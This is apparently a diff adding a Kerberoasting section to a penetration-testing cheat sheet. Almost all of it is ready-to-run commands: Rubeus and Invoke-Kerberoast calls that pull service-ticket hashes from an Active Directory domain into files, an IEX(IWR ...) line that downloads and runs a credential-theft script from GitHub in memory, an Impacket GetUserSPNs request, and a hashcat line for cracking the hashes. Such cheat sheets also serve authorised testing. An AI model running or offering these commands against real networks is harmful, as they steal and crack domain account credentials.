@@ -28,6 +28,81 @@
 
 #### 3) hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt
 
+# Do Kerberoasting
+
+## Windows
+
+### 1) Rubeus (Binary)
+
+##### Kerberoast all users in Domain and output to file
+
+    Rubeus.exe kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt
+
+##### Kerberoast all users in alternative Domain
+
+    Rubeus.exe kerberoast /nowrap /domain:[Domain]
+
+##### Only kerberoast RC4 compatible types
+
+    Rubeus.exe kerberoast /nowrap /rc4opsec
+
+##### Only kerberoast AES compatible types
+
+    Rubeus.exe kerberoast /nowrap /aes
+
+##### Specific users
+
+    Rubeus.exe kerberoast /user:[User] /nowrap
+
+##### List statistics about found Kerberoastable accounts (Quiet)
+
+    Rubeus.exe kerberoast /stats
+
+### 2) Rubeus (Powershell)
+
+##### Kerberoast all users in Domain and output to file
+
+    Invoke-Rubeus -Command "kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt"
+
+##### Kerberoast all users in alternative Domain
+
+    Invoke-Rubeus -Command "kerberoast /nowrap /domain:[Domain]"
+
+##### Only kerberoast RC4 compatible types
+
+    Invoke-Rubeus -Command "kerberoast /nowrap /rc4opsec"
+
+##### Only kerberoast AES compatible types
+
+    Invoke-Rubeus -Command "kerberoast /nowrap /aes"
+
+##### Specific users
+
+    Invoke-Rubeus -Command "kerberoast /user:[User] /nowrap"
+
+##### List statistics about found Kerberoastable accounts (Quiet)
+
+    Invoke-Rubeus -Command "kerberoast /stats"
+
+### 3) Invoke-Kerberoast
+
+##### Load into memory
+
+    IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1)
+
+##### Standard Run
+
+    Invoke-Kerberoast | FL
+
+##### Dump only hashes in a file
+
+    Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File "[Path]" -Encoding "ASCII"
+
+## Linux
+
+### 1) Impacket GetUserSPNs
+
+    GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
 
 # Kerberoasting 
 
